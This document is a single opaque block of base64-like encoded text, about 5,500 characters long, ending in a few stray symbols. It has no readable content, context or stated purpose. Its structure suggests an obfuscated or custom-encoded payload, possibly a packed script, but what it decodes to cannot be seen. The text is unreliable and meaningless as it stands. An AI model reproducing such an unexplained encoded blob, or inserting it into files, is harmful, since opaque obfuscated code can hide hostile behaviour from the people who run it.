QrlDWweKPN92Bre8VUecIeeKViY+V9AKUJhDW1YiWekzj1mz2cLRPx5qP93vUJhrWupKVl8DoEXBhsLvtxYKWUoiBf3RP1YvUJhR2rYRUJhDW93cIeeKViYvUJhzW9oiP1YKmc3R2rYRNxyRPwmzNzk8V538QUhKPY5XBY8DoEhOJyb8QS0Dj5LDmxYKWUoiBfpzBJLR2rYRU93RP1YDWzAKI5Lrt+hKS9e8VUeDW9AzWUADWrwDWSAzPSgKVSlznDTBh+Az2aLvnf48Pug82UY8mbyrtxuKBbTBVYVDBLb8VU4XnfVKQDLXB+pDj5Laj0yrtrkiAs9DtxuKS9AKQ8yrtrY8AJbqnbpOA+pXA0pBm0XrtxYKWUoiWUbDj5LXB+AKQiKaS5LvG5LrWx18mrYKmcpDjFh8IU0zPx5zPchOhshDo0XrW91iS9yiW10DBE9DBDXBhsLDBsFKQf5qP93DB+4zPuYRQ+YzBfIRPu1zG18DhD3rtrki10J2nEh2BDMDhwyiW108QfYRIYeKWxyR2r4XB+AKQiKaU5pOJp9Bh+ki2+gqt+lKBs3vnshBLyLDjJk8IU0zPx5vLyXBLyLDjurGYfUUBfNPUfSvNer+d+SGhfOcN1SvP+eZnsLDBsLDBsLUbSaUNN92BDbzWSw2BDMBLyLDjurGYfUUBfNPUfSvNer+d+SGhfOcN1SvP1kKm+yDBsLDBsLUbSaUNN92BDbKP93iWe8DoEXBhsLvdYONSUNDS+zNdN9ndYd+dUODdwfGNN9ZPUe8hsLDBsLDBfPcNuU+G18Dh+wzPSA2BDMBLyLDjupKmf1iBf5Z2fYv2x1RV1piBfIRPu1zG18DhD3zIU52QzkRIShXBroqWS3zINhXnEh2BDMBLyF7Izk8V5M2WEhOJpAz2+18VELrW91iS9yiW10OJp9BVz1KVx5qP93DW1eqIUg8V9kKU94zPuYRQ+gqt+lKBLLrWupKV00rWSAzPd0rWx18mrYKmc0rtYYR2D0rW1kKm+y7B+bR2bLXcpTBVi0KIreKBsbiWr02QrkKI5TBh+ki2+gqt+lKBs9DBDXBouVKQrlDWweKPN92BrAKI9lcIeeKViY+V9AKUJhDW1YiWekzj1mz2cLRPx5qP93vUJhrWupKVl8DoEXBhsLvtxYKWUoiBf3RP1YvUJh8V9kKUJhDW93cIeeKViYvUJhzW9oiP1YKmc38V9kKNxyRPwmzNzk8V538QUhKPY5XBY8DoEhOJyb8QS0Dj5LDmxYKWUoiBfpzBJL8V9kKU93RP1YDWzAKI5Lrt+hKS9AKI9lDtiyz2rYDWSAzPSgqPc9rWSAzPdLKQrbz2DLRmbL8V9kKU93RP1YDo0XrtrY8As9DtxuKS9uiPUAZnLb8QS0XG0XqPRLXB+Az2apDWzk8hsyrWbLvnsJOALb8V9QDj5L8QS02QrkiALb8VU47B+pXnbTrWb6XAbXZJyb8IU0zPx5zPcLvnsyrtrki10J2ns9vnsbRQUA8VU3iBbLvAr4zPuYRQ+YzBDHDBDhOJybKQU52Ie5KPJL7o5LDLyXDBsLDjuk8t+pKIELrtxYKWUoiWUbDtzeKtUYvUJhDhEb8V9QP4fi7hr8DoEh7Ve5KPu48WUoqPS0RIee8mayrtrki10u2nbTBm5XrW91iS9yiW10DBE9DBDXBhsLvB94zPuYRQcMBLyLDjurGYfUUBfNPUfSvNer+d+SGhfOcN1SvP+eZnsLDBsLDBsLUbSaUNN92BDbzWSw2BDLDBsLDBsLDjEXBhsLvdYONSUNDS+zNdN9ndYd+dUODdwfGNN9KP93iWLLDBsLDBfPcNuU+G18Dh+lKIw5qSJhDBsLDBsLDBsMBLyLDjurGYfUUBfNPUfSvNer+d+SGhfOcN1Sv2YYR2DLDBsLDBsLUbSaUNN92BDbZPUe8YJhDBsLDBsLvLyXDBsFnNwcUUcLUSYc+G1DnN+d+NELGbSx+G1e8VUeDBsLDBsLDSzfGSUSvUJhrWSAzPS8DhsLDBsLDBsLDjEXBhsLvWY38tU5Dt+w8WN98QUhKPY5DtzeKtUYvUJhDhwmz2+giV9oRPDyDVxyRPwmznDp7hr8DoEXBoJkzV9AKGw8KhDTBmrYitUAKhsbKQU52Ie5KPJTBm5XzmU3RQ+pKIELq2xgztx5DBLLrW1kKm+y7B+bR2b0rtYYR2D0rWeki2D9Dh5uDhbXZJppzhLLrWeki2DLDG5L7GdLDBRVrWeki2DLvoapBmrYitUAKhLL7GdLXG0XqPRyDBSbR2+YXBshnnD0KPl5qP1YXjdA7js0aBJbKP93iWL0rW+eZn5u7B+wzPSAXnbLrhRXzWS5znLLDbbh7W16iWYlznLuahJJ7js0rW1kKm+y7B+bR2b0rtYYR2DpXnbX8VU5i2r3XBsJDBbTBVU08IUpzhLLzWS5znLLDbbh7W16iWYlznLuahJJ7js0rW1kKm+y7B+bR2blanJbZPUe8hbpDBRVBhSbR2+YXBshnnD0KPl5qP1YXjdA7js0aBJbKP93iWL0rW+eZnJbZPUe8hbpXcpAz2+18VEyDjdLXG0XzPu4zcpAz2+18VEyDB5uDBbTBm5XzmU3RQ+pKIELRQrk8Qxgztx5DBLLrtx5R2r57B+YKVcLXcpTBVYVXBsezWS5znLLDbbh7B+4iWSAiBbLrhzbR2+YXBshnnD0rWU3zBbpBh+lKI+pzVYoR2+pKIELvnsla4RJaj0XzPu4zPYVXBsLzWS5znLLDbbh7B+4iWSAiBbLrhRezWS5znLLDbbh7B+YKVcpXcybKP9bqPzpRIS5qP93Dj5La4RJaj0XzPu4zcybKP9bqPzpRIS5qP93Dj5Laj0X8VU5i2r3DB+lKI+pzVYoR2+pKIETBm5XzmU3RQ+pKIELRVSoqQUJ2Q+eRVuY8ALbqW94iBJbi2xY8hJb8WS48AJbKVSlznJbitYJznJbiWShKWU4Dj5LrAymXcpTBh+Az2+18VELvnsmr40XrWupKV0LvnflZ2xuKS9oKIw3zPx5XB+yKQx57B+18IUA7B+JR2x4XG0XK2Y48Pug8IU0zPx52I+hXB+3RP1Y7B+0qPw6XG0XqPRyrt+eRVuY8As9vnsmXh8pBm0Xrt+eRVuY8As9DWSA8VSwXBbTBh+Az2x1KtcLvnflZ2xuKS9uiPUAZnLmN5evUAfNcNra+UamXG0XiIepKWNyrtrkiAs9DW1w8QS02IzYiWxy2QrkiALb8VU4iPu5XnbXZJybiWShKWU4P15Lvnsb8V9QP4fiOJp9Bm5XzPu4zcpTBh+5RPr0z2aLvnfp819e8mreZnLbiWShKWU4Xns/rt+eRVuY8AsHDWUE8WukzWNyrAJm7B+5RPr0z2apOJp9BVzk8VUeRILyrt+eRVuY8Afe8AsbiWShKWNpBm0XrtrY8QU0iBs9DW1w8QS02QS1z2rwXBiG+NuSc1cLXhfWNb9xDB83rt+eRVuYXG0XrWw1KU9VqPU0ztaLvnflZ2xuKS93iP1gzVYYKW+4XB+Az2x1KtcpOJyb8VU5i2r37o5Lr5+nG1sLUdSBGdNLrAEbiWShKWN3r40mOJyb8V9Qahs9DW1w8QS02IzYiWxy2QrkiAelZ2xuKS9uiPUAZnLmN5evUAfjNbUfUdNLUdSBGdNLrAEbiWShKWNpXG0XrtrYitUAKhE9DBr8KYu3DhEb8V9QaY0u2nEhO1u32WEhOJpVKQDLXB+pDj5Laj0bqnsFrWw1KU9VqPU0ztaTrWb6XAbLBm0XiIepKWNyrtrkiAs9DW1w8QS02IzYiWxy2QrkiALb8VU4iPu5XnbXZJyb8VU5i2r37o5Lr5YON5UnUBfrGY+vDB83rt+eRVuY7h8LUbSaUNUGXB8TBVzk8hLbqo5JOA+CvB+3iP1gzVYYKW+4OA+CXA0pDspTBh+AKQiKrWpiDj5LRP+b8Iue8IeY8ALb8V9QPA+C2nbTBh+AKQiKrWpiDj5Lz2rYz19Az2f0RPxYXBr8KhD0DYu8KhD0rtrki10bqY5pOJppzhsyq2x4z2cyrtrki10bqY5pXnfTrtrYitUAKhE9DB8hrAEb8V9QPA+C2nEmDh8TgPU08INLZA+Az2+18VE3vnsmDhDmOQ5XqPRLXB+CvBLbKmUl2IzpzPub8A5uXnbLZA+Az2+18VE3vnsm7B8Tgcp9Bh+Az2+18VE3vnshXGl8KhDTBm5Xgcyb8VU5i2r37o5h2Ww8KYu3Do0XgcybzWS5RPre8IUgRVSoqQUJDj5LrAE37IreRIl18tak8I9e2I+h2IreRIl18B83iWYlznLp7h838QS0r40XrWeeKV+0zns9DWzk8WU3XB+bR2+eRVS4zU9hRPx6i2s0rQ86rAbTBVzQ8VY5znLbqWS3zWuY7B+Az2+18VEpOJpVRIuk8INyrWeeKV+0znbTBh+VqPuYKVSlzns9DBiVKI1Y2I+h2IreRIl18B83iWYlznLp7h838QS0r40XrW+eiWNLvnfbR2+YXBiz7P5lzBfDOVbH8A8pOJybRP+bDj5LK2Y48Pug82UY8mbyDbYON5UnUBfrGY+vDWreRIl18taLXWfpzWs0DWfbR2+YRBJLRt+w8WUL7BfLzVY0zPspDsyXBcbrUbSaUNUGDBeOUNua7BsmrW+eiWNm7Bsmrt+w8WNm7BsmrWzpKWU3RP1YrAbTDhbLKQDLzWYYXW1w8QS02IUA8V9AXBbpOJpAz2+18VELrWzpKWU3RP1YOJp9BVz1KVx5qP93DtrY8Q+k8VUgiWShKWU4XB+VqPuYKVSlznJbqW94iBJbi2xY8VweKPN0rtfe8QxQKQrb7B+bR2+eRVS4znYTBV1w8QS02IxkKVwYRQcyrWek8Qc0rtU4z2r3RP1Y7B+JR2x4iI9AzBbLKQDLzWYYXBiS8mrk8hfoKIw3zPx5qPwmDt+kDd1wN1SaDtxY8mzY8oyLrAwlZ2xuKS9Y8mrk8hLpXG0XK2Y48Pug8IU0zPx52I+hXB+bR2+eRVS4znbLKQDLzWYYXBiS8mrk8hf4zPuYRQ+pKV8LG2YGNNJLzWS5RPre8INHDB83K2Y48Pugz2rAKQDyXnbTBh+5zP1JKWY3zns9DB8mOJybKWY3z2aLvnfVqPuYXB+VqPuYKVSlznbTBVzk8VUeRILLXB+0qPwY8Afe8AsbKWY3znYTBVYVDBe4iPr4itDyrWupKVN0aBJAXns9vnsm7n5mgtJbKWY3zns9vnsmrAbXRI93iWY3iPNTBh+5zP1JKWY3zns3vnsbKWY3zG0XqPRLXtx1Rmx58he58VYlXB+0qPwYXnJlanJuXns9vnsmOA8pB20XK2Y48Pug82UY8mbyrt+YK2f0qPwYXnfk8hfJ8VY3iBLm+2rAKQDL8WUAzV9AKPY3zAfuiPUAZnf8r4u4itrkKV8MrAEbiWUl8WupKVNL7hi8r4yLrAwlZ2xuKS9Y8mrk8hLpDBEmvWrADBFMvWrADBFMrAbTBh+5zP1JKWY3zns9DB8mOJp9Bm5XgcyTbQ]aK_ZpJYByr]Il@~EY
